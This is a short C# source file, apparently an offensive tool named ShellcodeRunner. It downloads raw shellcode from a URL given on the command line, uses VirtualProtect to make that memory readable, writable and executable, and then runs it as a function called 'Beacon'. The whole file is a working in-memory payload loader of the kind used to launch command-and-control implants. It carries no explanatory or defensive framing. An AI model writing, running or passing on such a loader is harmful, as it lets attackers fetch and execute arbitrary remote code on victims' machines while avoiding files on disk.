using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void Beacon();

        [DllImport("kernel32.dll")]
        static extern unsafe bool VirtualProtect(
            byte* lpAddress,
            uint dwSize,
            MemoryProtection flNewProtect,
            out MemoryProtection lpflOldProtect);

        enum MemoryProtection : uint
        {
            PageExecuteReadWrite = 0x40
        }

        static async Task Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.Error.WriteLine("Usage: ShellcodeRunner <url>");
                Environment.Exit(1);
            }

            byte[] shellcode;
            using (var client = new HttpClient())
            {
                shellcode = await client.GetByteArrayAsync(args[0]);
            }

            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    VirtualProtect(
                        ptr,
                        (uint)shellcode.Length,
                        MemoryProtection.PageExecuteReadWrite,
                        out _);

                    var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
                    beacon();
                }
            }
        }
    }
}